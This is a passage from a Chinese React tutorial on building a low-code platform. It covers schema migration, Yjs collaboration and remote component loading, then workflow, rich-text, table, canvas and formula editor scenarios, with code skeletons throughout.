      "style": { "margin-top": "10px" },
      "events": [{ "event": "onClick", "action": "confirmModal" }]
    }
  ]
}
```

```json
{
  "version": 3,
  "state": { "pageVariables": [], "globalVariables": [] },
  "dataSources": [],
  "nodes": [
    {
      "id": "n1", "type": "button",
      "props": { "text": "提交" },
      "style": { "marginTop": 10 },
      "events": [{ "event": "onClick", "actions": [
        { "type": "openModal", "config": { "modalId": "confirmModal" } }
      ] }]
    }
  ]
}
```

工程纪律五条，每条都有血泪背景：其一，**第一天就带 version**——没有版本号的存量数据只能"猜"（猜错就毁数据），`migrateSchema` 里 `typeof s.version !== 'number'` 时按 v1 处理是补救不是方案。其二，**保存时永远写 LATEST**——迁移只发生在"读取旧数据"时，编辑器一保存就固化成新版本，数据自然向新版本收敛。其三，**未知字段原样保留**——迁移函数里对没见过的字段（包括 `x-*` 扩展）只透传不删除，否则迁移本身就是数据损坏源。其四，**每个迁移配快照测试**——用真实存量页面做 fixture（`v1-fixture.json` → 期望 `v3-expected.json`），没有测试的迁移链等于定时炸弹。其五，**迁移失败要有兜底 UI**——渲染器入口 `try { migrateSchema } catch` 后降级展示"该页面由旧版本创建，暂时无法打开"并上报，绝不能白屏（错误边界兜底，见第 9 章）。

**常见坑（症状→根因→修法）**：症状——某老页面迁移后"能用但行为不对"（按钮点不开弹窗）。根因——迁移函数把语义映射错了（v1 的 `action: 'confirmModal'` 其实有两种含义：弹窗 id 或"提交表单"指令，迁移一刀切当成了弹窗）。修法——凡是"旧值有歧义"的迁移，不要静默映射：迁移成最接近的新结构 + 在节点上打 `x-migrated-from: 'v1-action'` 标记 + 打开该页面时提示用户复核——**迁移可以降级，不能撒谎**。

#### 路线 10：选修——Yjs 协同与物料远程加载

**选修一：协同编辑（Yjs CRDT 概念）**。多人同时编辑同一个页面 schema 是低代码平台的进阶能力，Yjs 是当前事实标准的底层库。五个概念先建立：

- **CRDT（无冲突复制数据类型）**：多个客户端各自改动，不需要中央锁与仲裁，最终自动收敛到同一状态——这是协同编辑"不互相覆盖"的数学基础。相对的是 OT（操作变换，需要服务器参与变换，Google Docs 路线），前端独立项目用 CRDT 成本低得多。
- **Y.Doc 与共享类型**：`Y.Map`/`Y.Array`/`Y.Text` 是带 CRDT 语义的容器。直觉：把"每个画布节点"做成一个 `Y.Map`，把"某容器的 children"做成一个 `Y.Array`，树结构天然映射。
- **Update 与传输无关**：本地改动编码成二进制 update（`Y.encodeStateAsUpdate`），任何通道都能传（WebSocket、甚至塞进评论系统）；收到远端 update 就 `Y.applyUpdate`。Provider（`y-websocket`/`y-webrtc`）只是现成的通道实现。
- **Awareness（感知）**：光标、选中的节点、在线名单这类"瞬时状态"不进文档（不进 undo、不持久化），走 awareness 广播——低代码里用它同步"协作者正在编辑哪个节点"。
- **Undo 的边界**：`Y.UndoManager` 只撤销自己的操作（别人的操作不会被你 Ctrl+Z 掉），这是协同编辑器与单人编辑器 undo 的本质差异。

```ts
// collab/pageDoc.ts —— 最小协同骨架
import * as Y from 'yjs';
import { WebsocketProvider } from 'y-websocket';

const doc = new Y.Doc();
const nodesMap = doc.getMap<Y.Map<unknown>>('nodes'); // 节点按 id 寻址：并发改不同节点零冲突
const provider = new WebsocketProvider('wss://collab.example', 'page-42', doc);

// 本地插入节点：事务保证这组变更在 CRDT 里是一条原子记录
doc.transact(() => {
  const node = new Y.Map<unknown>();
  node.set('id', 'n9');
  node.set('type', 'button');
  node.set('text', '提交');
  nodesMap.set('n9', node);
});

// 远端/本地变更统一驱动本地投影：Y.Map → 普通对象 → zustand → 画布重渲染
nodesMap.observe(() => {
  syncToEditorStore(nodesMap.toJSON());
});

// awareness：广播“我在编辑 n9”
provider.awareness.setLocalStateField('editing', { nodeId: 'n9', userName: '张三' });
```

集成姿势的正反例：**反例**是把整份 schema 序列化成字符串塞进 `Y.Text`——两人同时保存时整串合并，diff 粒度是字符，树结构会被合并坏。**正例**是结构化建模（节点 = `Y.Map`，children 顺序 = `Y.Array`），CRDT 在结构层面解决并发，两人同时往同一容器拖组件时两个都保留、顺序由算法决定。协同进一步展开（光标相对位置、离线补发、权限）见 [react-高阶场景全景图.md](react-高阶场景全景图.md) 的协同族群。

**选修二：物料远程加载（模块联邦 vs 动态 import）**。平台要"不停机上新物料"——物料包独立构建、独立发布、平台运行时拉取注册。

动态 import 路线（工具链无关，ESM 标准）：

```ts
// materials/remoteLoad.ts
const materialRegistry = /* 宿主的全局注册表 */ null as any;

export async function loadRemoteMaterial(cdnBase: string, pkg: string, version: string) {
  // 物料包构建时把 react/react-dom 声明为 external（不打进产物），避免双 React 实例
  const url = `${cdnBase}/${pkg}@${version}/index.js`;
  const mod = await import(/* @vite-ignore */ url); // @vite-ignore：告诉打包器这是纯运行时地址
  mod.setup(materialRegistry); // 物料包入口约定：setup(registry) 注册组件 + 元信息 + setters 声明
}
```

模块联邦（Module Federation，webpack 5 / rspack 系）路线：构建期声明 `exposes`（物料包暴露哪些模块）与 `shared`（react 单例共享、版本协商），宿主 `remoteName/module` 形式 import，运行时自动解决"两边 React 必须同一个实例"的问题。对比：

| 维度 | 动态 import + external | 模块联邦 |
|---|---|---|
| 工具链 | 任何支持 ESM 的构建（版本敏感度低） | 绑定支持 MF 的构建链（webpack/rspack 系） |
| 共享依赖 | 手工保证（external + import map / 宿主全局注入），配错就是双 React（症状：invalid hook call） | 声明式 shared + 运行时协商，几乎零心智负担 |
| 远端不可用 | 一个物料挂就挂它自己（import 失败可 catch 降级占位） | shared 协商失败/远端宕机会在加载期抛错，需要 fallback 配置 |
| 版本管理 | URL 即版本（`@1.2.0`），回滚 = 换 URL | 版本在构建配置里，回滚要重发或依赖运行时版本表 |
| 适合 | 物料来自多团队/多仓库、CDN 分发 | 单一构建体系内（微前端同源技术栈）的宿主-物料共享 |

无论哪条路线，两条铁律：**React 必须单例**（双实例的症状就是 React 报 invalid hook call，页面崩），**物料加载失败必须可降级**（画布上渲染"物料未加载"占位节点而不是让整页挂掉——与第 9 章"未知 type 兜底"同一条原则）。

### 难点与坑

- ⚠️ **iframe 画布的事件与选中态同步（坐标换算、postMessage 协议设计）**

  症状有三连，逐个拆。症状一：画布里点组件，右侧属性面板不切换。根因：画布 iframe 里的 click 事件不会冒泡到父页面（跨 document），宿主根本不知道发生了点击。修法：画布运行时给每个节点挂 `data-node-id`，iframe 内监听 click 做"从事件目标向上找 id"的命中测试，命中后 `postMessage({kind:'selected', nodeId})` 上报（路线 2 的画布侧代码）；宿主校验 `e.source` 后写入选中 store。症状二：选中框位置漂移——画布缩放 75% 时选中框偏右下，缩放越小偏得越多。根因：`transform: scale` 默认 `transform-origin: center`，坐标映射多了一个随外框尺寸变化的常数项，路线 2 的线性换算公式不再成立；或者换算用了缓存的旧外框位置（面板开合后外框移动了）。修法：外框容器固定 `transform-origin: '0 0'`，且每次换算实时 `getBoundingClientRect`；画布滚动/ResizeObserver 变化时上报 `viewport`，覆盖层跟随。症状三：从物料面板拖到画布上，指示线不动、松手没反应。根因：pointer 事件不穿透 iframe，宿主的 dragover 在指针进入 iframe 后停更。修法：拖拽期间 iframe `pointer-events: none`，宿主持续把指针换算成内部坐标发给画布，画布做命中测试画指示线，drop 后回报落点由宿主改 schema。

- ⚠️ **事件链死循环（A 触发 B、B 触发 A）→ 动作执行深度上限**

  症状：用户点一次按钮，页面永久冻结（无报错）或瞬间抛 `RangeError: Maximum call stack size exceeded`；Network 面板同一请求刷屏；标签页 CPU 占满只能关闭。根因：协议允许 `emitEvent` 跨节点触发事件，schema 里形成环（路线 6 的 ping-pong 复现：`btn.onClick → card.ping → btn.pong → card.ping → …`）；同步实现栈溢出，async 实现微任务队列永不排空、渲染帧饿死——后者的无声冻结比崩溃更难排查。修法三件套：引擎递归入口携带 `depth`，emit/变量监听触发的新分发 depth+1，超过 `MAX_ACTION_DEPTH`（如 32）抛 `CycleGuardError` 并 toast 链路信息；保存时对字面量可见的环做 lint 提示；两者互补（静态图抓手误、深度上限兜底动态环），理由与边界路线 6 已详述。

- ⚠️ **协议无版本管理，旧页面打不开 → 一开始就带 version**

  症状：平台发布一版后，上周搭好的活动页打开白屏；控制台是 `Cannot read properties of undefined (reading 'children')` 之类的协议错位报错。根因：渲染器按新协议解释旧结构（新代码读 `events[].actions`，旧数据只有 `events[].action`），`undefined.actions` 解构/遍历即抛错，React 组件树卸载成白屏。修法分两层：根治层——协议第一天带 `version`，维护 migration 链（路线 9），渲染入口先迁移再渲染；兜底层——渲染器对未知 `type`/缺字段节点渲染占位组件并上报错误，节点级 Error Boundary 防止单点异常放倒整页。两层都要：前者治数据，后者治还没来得及迁移的空窗期。

### 对标开源

amis（渲染协议最全，必读）→ 阿里 lowcode-engine（编辑器工程化标准 + 《中后台搭建协议规范》）→ Appsmith / ToolJet（开源全栈低代码）

对标顺序即阅读顺序，三站各有分工。**amis**：研究它的 schema 词汇量与运行时架构——`type` 如何映射到渲染器（`packages/amis-core` 的 factories/Renderer 注册机制）、表达式 `${}` 的上下文注入、`onEvent` 与动作系统（动作名、成功/失败分支、串行语义）。本章的 events/bindings 设计做完后对照 amis 的动作清单查漏，你会发现"条件分支、循环、并行"都是动作系统的自然扩展。**lowcode-engine**：研究编辑器工程化——面板骨架（skeleton）、设计器（designer，拖拽与投放位置计算）、setter 体系与《中后台搭建协议规范》（它的协议规范文档是中文世界最系统的搭建协议参考，version 字段与规范治理方式值得照抄）。本章的 EventSetter、iframe 画布、协议 version 都能找到它的成熟对照实现。**Appsmith / ToolJet**：研究"全栈"边界——它们把数据源（数据库直连/REST）、权限、自定义 JS 沙箱、部署打成完整产品，重点看它们如何划定"用户脚本能做什么"（对照路线 7 的信任分层）与数据源抽象（对照第 4 章的 `DataSource` 接口）。

✅ **产出**：mini 低代码平台——10+ 物料、拖拽搭建、属性/样式/事件配置、变量与接口绑定、预览发布、schema 导入导出与版本迁移。

验收清单逐项可打勾时本章才算完成：

1. 物料 10+ 种，覆盖容器（grid/card）、表单（input/select）、展示（text/image/cardList）、反馈（modal/toast 触发器）。
2. 从物料面板拖入 iframe 画布，嵌套容器落点正确（路线 2 的指针转发 + 命中测试全链路）。
3. 属性面板：普通属性用第 3 章 Setter；`bindings` 用 ExpressionSetter（含语法校验与实时预览）；`events` 用 EventSetter（动作链增删排序）。
4. 变量系统：改一个页面变量，所有绑定它的组件更新，Profiler 里只有这些组件重渲染（路线 5 推模型生效）。
5. 事件链：点击按钮 → 调接口 → 结果写入变量 → 卡片列表刷新，全程动作串行；手工构造 ping-pong 死循环 schema，深度上限正确熔断并提示。
6. runJs 动作在 quickjs（或 iframe sandbox）沙箱里执行：能读注入的变量快照、拿不到 `document.cookie`（用路线 7 的逃逸代码验证防御生效）。
7. schema 导出 → 改 `version` 为 1 → 再导入，migration 链把它升回最新且数据无损（快照测试守护）。
8. 预览与"发布"：预览页 = 纯渲染器 + schema（无编辑器代码）；发布 = schema 存库 + 渲染页加载。

## 7. 扩展场景（同难度梯度，可选方向）

> 完整的高阶场景地图（7 大族群 23 个场景：富文本/协同/音视频/GIS/3D/微前端/在线 IDE/百万级性能/AI 原生前端等）见 [react-高阶场景全景图.md](react-高阶场景全景图.md)。

| 场景 | 核心技术 | 对标 |
|---|---|---|
| 节点编排画布（n8n/Dify 式工作流） | reactflow（自研节点/边/自动布局/小地图） | n8n、Dify |
| 富文本/文档编辑器 | prosemirror 生态（tiptap）、协同（Yjs） | Notion 类 |
| 复杂数据表格 | tanstack table（分组/虚拟/行内编辑/列拖拽），ag-grid | 飞书表格 |
| 画布类编辑器（白板/海报） | react-konva / Pixi、坐标系与缩放平移变换 | excalidraw、稿定 |
| 公式编辑器 | 语法树 + monarch/lezer | Excel 公式栏 |

这五个场景与前面六章共享同一个内核（schema/注册表/递归/undo），但各自往下再挖一层专用技术。每个场景按"核心技术地图 → 最小可行切入点 → 对标项目的正确打开方式"三段展开，目标是让你用一章的时间做出"能玩起来"的最小版本，再决定是否深入。

### 7.1 节点编排画布（n8n/Dify 式工作流）

**是什么**：一张无限画布上摆"节点"（一步操作：调接口、条件判断、代码块），节点之间连线定义执行顺序，产物是工作流 schema。与第 6 章低代码的区别：低代码搭的是"页面"（树结构），编排搭的是"流程"（图结构）——因此渲染层从"递归树"变成"图布局 + 边路由"。

**核心技术地图**：

- **@xyflow/react（reactflow 的新包名）**：React 生态节点画布的事实标准。它管最难的通用部分——画布缩放平移（viewport）、节点拖动、边命中、小地图（MiniMap）、背景网格（Background）、撤销的基础数据结构（nodes/edges 就是两个受控数组）。你只负责自定义节点内容与交互。
- **自定义节点与连线桩**：每个节点是一个普通 React 组件；`Handle` 组件声明"输入桩/输出桩"（source/target），桩的 `position` 决定边从哪里进哪里出。
- **自动布局**：reactflow 不管布局，节点坐标由你维护。接 dagre（有向图布局，`@dagrejs/dagre`）做"一键整理"：建图 → `layout()` → 把算好的 x/y 写回节点。
- **流程语义层**（真正的业务）：schema 设计（节点/边/参数）、执行引擎（拓扑遍历或事件驱动）、环检测（工作流里"不允许环"通常是硬约束——这里就必须建依赖图了，对照第 6 章"深度上限 vs 依赖图"的取舍讨论，语境不同选择反转：流程图的边是静态字面量，建图毫无歧义）。

**最小可行切入点**：做一个 5 种节点的工作流编辑器——开始、HTTP 请求、条件分支、结束、备注。步骤：(1) `useNodesState`/`useEdgesState` 管两个数组，先允许手动拖摆、手动连线；(2) 每种节点写一个自定义组件（HTTP 节点展示 url 与状态灯）；(3) 接 dagre 实现"自动布局"按钮；(4) "运行"按钮 = 从开始节点拓扑遍历，逐节点把执行日志打到右侧面板、节点状态灯依次变绿——到这一步 n8n 的核心体验已经有了。

```tsx
// workflow/FlowEditor.tsx —— 最小骨架
import { useCallback } from 'react';
import {
  ReactFlow, Background, Controls, MiniMap,
  type Node, type Edge, type Connection, addEdge,
  useNodesState, useEdgesState,
} from '@xyflow/react';
import '@xyflow/react/dist/style.css';
import { HttpNode, StartNode, EndNode, NoteNode, BranchNode } from './nodes';

const nodeTypes = { http: HttpNode, start: StartNode, end: EndNode, note: NoteNode, branch: BranchNode };

export function FlowEditor() {
  const [nodes, setNodes, onNodesChange] = useNodesState<Node>([]);
  const [edges, setEdges, onEdgesChange] = useEdgesState<Edge>([]);

  const onConnect = useCallback(
    (conn: Connection) => setEdges((eds) => addEdge({ ...conn, animated: true }, eds)),
    [setEdges],
  );

  return (
    <ReactFlow
      nodes={nodes} edges={edges}
      nodeTypes={nodeTypes}          // type 字符串 → 自定义节点组件（第 1 章注册表思想）
      onNodesChange={onNodesChange}  // 受控：拖动/选择的变更回调，schema 化与 undo 都挂在这层
      onEdgesChange={onEdgesChange}
      onConnect={onConnect}
      fitView
    >
      <Background /> <Controls /> <MiniMap />
    </ReactFlow>
  );
}
```

**对标项目的正确打开方式**：**Dify**（开源，`langgenius/dify`）的 workflow 编辑器就是 `@xyflow/react` 写的 React 应用——读它的 workflow 组件目录，重点看：自定义节点组件如何与表单抽屉联动、边（分支条件）的数据结构、"运行"时如何在画布上叠加执行状态。这是"reactflow 大型实战"最直接的教材。**n8n** 的编辑器 `packages/frontend/editor-ui` 是 **Vue 3** 实现——别去抄它的 React 写法（没有），要看的是它的**产品与节点协议设计**：节点 schema（inputs/outputs/parameters 声明）、参数的表达式语法、执行数据在节点间的传递模型（每个节点能引用上游节点输出）。交互与协议读 n8n，React 实现读 Dify，reactflow 官方文档的 examples（xyflow.com）当字典查。

### 7.2 富文本/文档编辑器

**是什么**：Notion/飞书文档式的块编辑器：内容是一棵结构化文档树（段落、标题、图片、"信息卡片"块），支持格式刷、协同、斜杠命令。与 `<textarea>` 的本质差异：内容模型是树不是字符串，编辑产生的是"事务（Transaction）"不是字符差量。

**核心技术地图**：

- **ProseMirror 模型层**（一切的根）：文档 = 符合 Schema 的 Node 树（Node 带类型、属性、内容约束）；编辑 = EditorState 上派发 Transaction（对文档树的原子变更序列）；插件系统挂在 Transaction 生命周期上（keymap 快捷键、history 撤销、collab 协同、decorations 装饰高亮）。直接写 ProseMirror 学习曲线陡。
- **tiptap**：ProseMirror 的"友好发行版"——把模型层封装成扩展（Extension）API，React 集成开箱即用（`useEditor` + `EditorContent`），自定义块节点用 `NodeView` 渲染真正的 React 组件。入门顺序：tiptap 起步，理解不了行为时下沉到 ProseMirror 文档查根因。
- **自定义块（NodeView）**：Notion 感的来源——文档树里的某个节点类型由你的 React 组件渲染（进度条、投票卡片），可选中、可拖拽、内部还能有交互。
- **协同（Yjs）**：y-prosemirror 把 ProseMirror 的 Transaction 与 Yjs 文档双向绑定（第 6 章选修一的 Yjs 概念在这里落地）；`y-websocket` 做通道；awareness 做协作者光标。
- **安全**：粘贴与 HTML 导入必须消毒（DOMPurify）——富文本是 XSS 的传统重灾区。

**最小可行切入点**：不碰协同，先做"带两个自定义块 + 斜杠命令 + 本地持久化"的编辑器。步骤：(1) tiptap `StarterKit` 跑通基础编辑；(2) 写一个 mention 扩展（`@` 触发人员选择）与一个 info-card 块节点（NodeView 渲染 React 卡片，可改颜色）；(3) 斜杠命令菜单（`/` 弹出命令列表，tiptap 的 Suggestion 工具函数）；(4) `editor.getJSON()` 存 localStorage，刷新恢复；(5) 加 y-websocket + Collaboration 扩展，两个浏览器窗口同编一段文字看光标。

```tsx
// editor/RichEditor.tsx —— 起步骨架
import { useEditor, EditorContent } from '@tiptap/react';
import StarterKit from '@tiptap/starter-kit';

export function RichEditor({ onChange }: { onChange: (json: unknown) => void }) {
  const editor = useEditor({
    extensions: [StarterKit],   // 段落/标题/加粗/撤销等基础能力
    content: { type: 'doc', content: [{ type: 'paragraph' }] },
    onUpdate: ({ editor }) => onChange(editor.getJSON()), // 文档树 JSON = 你的 schema（又是协议！）
  });
  return <EditorContent editor={editor} />;
}
```

**对标项目的正确打开方式**：Notion 不开源，对标三件套——**BlockNote**（开源的 Notion 风块编辑器，基于 tiptap/ProseMirror，React 友好，读它如何组织"块"的 NodeView 与拖拽把手，是"自定义块"最佳实战教材）；**tiptap 官方仓库的 demos 与文档**（Extension API 设计教科书）；**AFFiNE / AppFlowy** 这类完整开源文档产品（看"编辑器如何嵌进产品"：块管理、页面树、权限，而不是去通读）。读 ProseMirror 本体源码不作为入门要求，先把它的官方文档"Introduction"与"Transform"两章读明白——它解释了"为什么编辑器必须是不可变文档树 + 事务"，这个心智模型比抄任何代码都值钱。

### 7.3 复杂数据表格

**是什么**：飞书表格/BI 明细页级别的表格——万行数据、分组折叠、多级表头、行内编辑、列拖拽换序、列宽拖拽、选中导出。它考验的不是"渲染表格"（那是一行 `map`），而是把排序/过滤/分组/分页/选中/列宽全部做成**受控状态机**之后的组合爆炸管理。

**核心技术地图**：

- **@tanstack/react-table（headless）**：核心设计是"无 UI 的表格状态机"——列定义（`ColumnDef`）+ 数据 + 一组行模型（`getCoreRowModel` / `getSortedRowModel` / `getFilteredRowModel` / `getGroupedRowModel` / `getExpandedRowModel` / `getPaginationRowModel`，按需接通、层层叠加）。UI 完全自己画（`flexRender` 渲染单元格），正好复用第 6 章注册表思想做"单元格渲染器注册表"。
- **虚拟滚动**：@tanstack/react-virtual 只渲染可视行，`estimatedRowSize` 定高先行，变高行（展开详情）是进阶题。
- **行内编辑**：单元格三态（展示态/编辑态/提交中）状态机；Esc 回滚、Enter 提交、Tab 跳下一格——交互细节的密度不低于架构。
- **列操作**：列宽拖拽（resize 的 mousemove 计算）、列拖拽换序（第 1 章 dnd-kit 复用）、列固定（sticky 定位）。
- **服务端模式**：数据量真大时 `manualPagination: true`，把排序/过滤参数发给后端，行模型只剩 core——"客户端全量"与"服务端分页"两种模式的切换要在架构第一天就想好。

**最小可行切入点**：1 万行 mock 数据（可控制行数与列类型）+ 客户端全家桶。步骤：(1) 基础表格 + 排序 + 过滤；(2) 分组 + 展开（`getGroupedRowModel` + `getExpandedRowModel`，按部门分组折叠）；(3) 接 react-virtual 虚拟滚动，Profiler 验证滚动时首行渲染开销恒定；(4) 行内编辑（数字列与下拉列两种单元格编辑器）；(5) dnd-kit 列拖拽换序 + 列宽拖拽；(6) 勾选导出 CSV。

```tsx
// table/BigTable.tsx —— headless 用法骨架
import { useMemo } from 'react';
import {
  useReactTable, getCoreRowModel, getSortedRowModel,
  getGroupedRowModel, getExpandedRowModel, flexRender,
  createColumnHelper, type SortingState,
} from '@tanstack/react-table';
import { useState } from 'react';

interface Row { id: string; name: string; dept: string; score: number }

const col = createColumnHelper<Row>();

export function BigTable({ data }: { data: Row[] }) {
  const [sorting, setSorting] = useState<SortingState>([]);
  const columns = useMemo(() => [
    col.accessor('dept', { header: '部门' }),                 // 分组列放前
    col.accessor('name', { header: '姓名' }),
    col.accessor('score', { header: '分数' }),
  ], []);
  const table = useReactTable({
    data, columns,
    state: { sorting }, onSortingChange: setSorting,          // 受控：排序状态在手里才能做 undo 与 URL 同步
    getCoreRowModel: getCoreRowModel(),
    getSortedRowModel: getSortedRowModel(),
    getGroupedRowModel: getGroupedRowModel(),                 // 分组与展开按需接入，不用的模型零开销
    getExpandedRowModel: getExpandedRowModel(),
  });
  return (
    <table>
      <thead>{table.getHeaderGroups().map((hg) => (
        <tr key={hg.id}>{hg.headers.map((h) => (
          <th key={h.id} onClick={h.column.getToggleSortingHandler()}>
            {flexRender(h.column.columnDef.header, h.getContext())}
          </th>))}
        </tr>))}
      </thead>
      <tbody>{table.getRowModel().rows.map((row) => (
        <tr key={row.id}>
          {row.getVisibleCells().map((cell) => (
            <td key={cell.id}>{flexRender(cell.column.columnDef.cell, cell.getContext())}</td>))}
        </tr>))}
      </tbody>
    </table>
  );
}
```

**对标项目的正确打开方式**：**飞书表格**当体验基准（亲手列出它哪些交互你没做：多级表头、单元格复制区域、冻结行列），不读源码（闭源）。开源侧：**AG Grid 社区版**（源码开放，读它解决"列宽拖拽时的重绘策略"与"列 pin 的 DOM 结构"这类硬骨头，它的文档本身就是复杂表格需求词典）；**Univer**（原 Luckysheet 的继任者，开源，看"表格 → 电子表格"的最后一步：公式引擎与二维网格的协同设计，正好接住 7.5 公式编辑器）；**@tanstack/table 官方 examples**（几乎每个 feature 一个可运行示例，当字典查）。不要一上来读 ag-grid 全部源码——按 feature 带着问题跳读。

### 7.4 画布类编辑器（白板/海报）

**是什么**：excalidraw 白板、稿定设计海报编辑器这类"自由画布"：元素可任意拖放、缩放、旋转，画布本身可缩放平移。与第 6 章画布的本质差异：低代码画布是"DOM 布局流"（元素按文档流排），这里是"绝对坐标系"（元素有 x/y/w/h/rotation，没有文档流）——一切交互变成**坐标系之间的数学**。

**核心技术地图**：

- **场景图（scene graph）**：元素列表 `{ id, type, x, y, width, height, rotation, zIndex, props }`，渲染顺序 = 数组顺序。没有 DOM 层级，"选中集合"是 id 的 Set。这是所有画布类产品的心脏，先把这个 schema 定下来。
- **react-konva**（Canvas 2D）：`Stage/Layer/Group/Rect/Text` 声明式映射到 Konva 场景树；`Transformer` 组件是神器——挂到选中元素上自动出现 8 个缩放柄 + 旋转柄，拖动直接改 width/height/rotation，手写这套柄的数学要一周，用它十分钟。
- **两个坐标系与变换公式**：屏幕坐标（px）与世界坐标（画布逻辑坐标）。缩放平移后：`世界 = (屏幕 - 视口偏移) / 缩放比`，反向 `屏幕 = 世界 × 缩放比 + 视口偏移`。所有交互（点击命中、拖动增量、框选矩形）都必须先做这个换算——和第 6 章 iframe 坐标换算是同一门课的不同考题。
- **滚轮缩放与空格平移**：`wheel` 事件里"以鼠标为中心缩放"（缩放时保持指针下的世界点不动，要反推视口偏移）；按住空格临时切平移模式（Figma/Excalidraw 通例）。
- **性能量级选择**：几百元素 Canvas 2D（react-konva）够用；上万元素或粒子特效上 WebGL（PixiJS）。先用 Canvas 2D，瓶颈证实了再换。

**最小可行切入点**：海报编辑器。步骤：(1) react-konva 画 4 种元素（矩形/圆/文字/图片）；(2) 点击选中（命中由 Konva 的事件系统代劳）+ `Transformer` 缩放旋转；(3) 拖动移动（`dragboundfunc` 限制在画布内）；(4) 滚轮缩放 + 空格平移；(5) undo/redo（元素数组快照或 immer patch，第 1 章 1.5 复用）；(6) `stage.toDataURL()` 导出 PNG。

```tsx
// poster/PosterCanvas.tsx —— 选中与 Transformer 的核心骨架
import { useRef, useState, type KonvaNodeComponent } from 'react';
import { Stage, Layer, Rect, Text, Transformer } from 'react-konva';
import type Konva from 'konva';

interface Shape { id: string; type: 'rect' | 'text'; x: number; y: number; w: number; h: number; text?: string }

export function PosterCanvas({ shapes }: { shapes: Shape[] }) {
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const trRef = useRef<Konva.Transformer>(null);
  const selectedRef = useRef<Konva.Node | null>(null);

  // 选中变化时把 Transformer 挂到对应节点上（Konva 命令式 API 与 React 声明式的经典缝合点）
  const attach = (node: Konva.Node | null) => {
    selectedRef.current = node;
    const tr = trRef.current!;
    if (node) { tr.nodes([node]); tr.getLayer()!.batchDraw(); }
    else tr.nodes([]);
  };

  return (
    <Stage width={800} height={600}>
      <Layer>
        {shapes.map((s) => s.type === 'rect'
          ? <Rect key={s.id} x={s.x} y={s.y} width={s.w} height={s.h} fill="#8cf"
              draggable
              ref={(node) => { if (node && s.id === selectedId) attach(node); }}
              onClick={(e) => { e.cancelBubble = true; setSelectedId(s.id); }} />
          : <Text key={s.id} x={s.x} y={s.y} text={s.text} fontSize={24} draggable
              ref={(node) => { if (node && s.id === selectedId) attach(node); }}
              onClick={(e) => { e.cancelBubble = true; setSelectedId(s.id); }} />)}
        <Transformer ref={trRef} rotateEnabled keepRatio={false} /> {/* 缩放旋转柄零成本获得 */}
      </Layer>
    </Stage>
  );
}
```

**对标项目的正确打开方式**：**excalidraw**（开源，`excalidraw/excalidraw`）——手绘风白板，读它的正确姿势是跳过 UI 层直奔三处：`src/element`（元素类型定义——一份教科书级的场景图 schema，注意它如何处理 rotation 与 bound text）、`src/actions/`（每个编辑操作一个 action 对象，do/undo 语义内建——命令模式的现代实现）、渲染层如何做脏矩形/分片重绘。**稿定**类商业产品闭源，当体验基准（模板系统、字体排版、导出多规格切图）。react-konva 文档的 demos 覆盖了拖拽/变换/事件全部基础题，照着敲一遍再动手设计自己的场景图。

### 7.5 公式编辑器

**是什么**：Excel 公式栏 / Notion 公式属性那类输入：输入 `=SUM(A1:A10) * rate`，实时语法高亮、错误下划线、引用变量补全、即时算出预览值。它是一条完整的编译器流水线（词法 → 语法 → AST → 求值）跑在一个输入框里，与第 1 章"手写 100 行 mini 求值器"是直系亲属。

**核心技术地图**：

- **流水线四段**：tokenize（数字/标识符/单元格引用 `A1` 与区间 `A1:B10`/运算符/字符串/括号）→ parse（优先级爬升或 Pratt 解析，处理一元负号、函数调用的参数列表）→ AST → evaluate（递归求值 + 引用解析：`A1` 去变量池/单元格取值）。第 1 章练过前半段，这里新增"引用与依赖"。
- **语法高亮两条路**：Monaco 的 **Monarch**（声明式正则 tokenizer，几十行配置就有专业高亮，接第 5 章 Monaco 编辑器顺理成章）或 CodeMirror 6 的 **lezer**（真增量解析器，高亮/折叠/错误定位一步到位，成本是要写文法）。
- **即时反馈**：光标停驻处的 token 高亮同源引用（Excel 点 A1 时同色高亮所有 A1）——要求 token 级位置信息贯穿流水线，这是"编辑器级"与"玩具级"的分水岭。
- **依赖与环**：公式引用变量/单元格，值变化要重算依赖它的公式（依赖图 + 拓扑排序）；`A1 = B1` 且 `B1 = A1` 是环，求值要检测并给出 `#CYCLE!` 类错误而不是死循环——第 6 章"依赖图 vs 深度上限"在这里有了最纯正的用武之地（引用是静态的，建图零歧义）。

**最小可行切入点**：Monaco + Monarch 路线一天可成。步骤：(1) 注册 `formula` 语言与 Monarch 规则（数字/运算符/函数名/引用/字符串五类 token）；(2) 复用第 1 章 mini 求值器，前面加一层"引用 token → 变量取值"的预处理（`A1` 替换为变量池的值或 `undefined` 报错）；(3) 输入防抖 → parse → AST → 求值，结果与第一个语法错误显示在输入框下方；(4) 变量面板点选插入引用；(5) 进阶：把引用依赖建成图，改变量后只重算受影响公式，构造环验证 `#CYCLE!`。

```ts
// formula/monarch.ts —— Monaco Monarch 高亮配置（接入第 5 章的编辑器）
import { languages } from 'monaco-editor';

languages.register({ id: 'formula' });
languages.setMonarchTokensProvider('formula', {
  tokenizer: {
    root: [
      [/[A-Z]+\d+/, 'variable'],                       // 单元格引用 A1
      [/\b(SUM|AVG|MIN|MAX|IF|ROUND)\b/, 'keyword'],   // 函数名
      [/\d+(\.\d+)?/, 'number'],
      [/"[^"]*"/, 'string'],
      [/[+\-*/^(),:]/, 'operator'],                    // : 是区间运算符（A1:B10）
      [/=/, 'operator'],
    ],
  },
});
```

```ts
// formula/evalWithDeps.ts —— 引用解析 + 环检测（求值器扩展）
import { parse, evaluate } from '../expr';

type CellMap = Record<string, string | number>; // 'A1' → 值或公式字符串（以 '=' 开头）

export function evalFormula(expr: string, cells: CellMap): { value?: unknown; error?: string } {
  const visiting = new Set<string>(); // DFS 的“在途”集合：遇到在途引用 = 环
  const resolved = new Map<string, unknown>();

  function resolveRef(ref: string): unknown {
    if (resolved.has(ref)) return resolved.get(ref);
    if (visiting.has(ref)) throw new Error(`#CYCLE! 引用环：${[...visiting, ref].join(' → ')}`);
    const raw = cells[ref];
    if (raw === undefined) throw new Error(`#REF! 未知引用 ${ref}`);
    if (typeof raw !== 'string' || !raw.startsWith('=')) return raw;   // 字面量直接返回
    visiting.add(ref);
    const value = evaluate(parse(raw.slice(1), { ref: resolveRef }));  // 求值器里引用回调到这里递归
    visiting.delete(ref);
    resolved.set(ref, value);
    return value;
  }

  try {
    return { value: evaluate(parse(expr.startsWith('=') ? expr.slice(1) : expr), { ref: resolveRef }) };
  } catch (e) {
    return { error: (e as Error).message };
  }
}
```

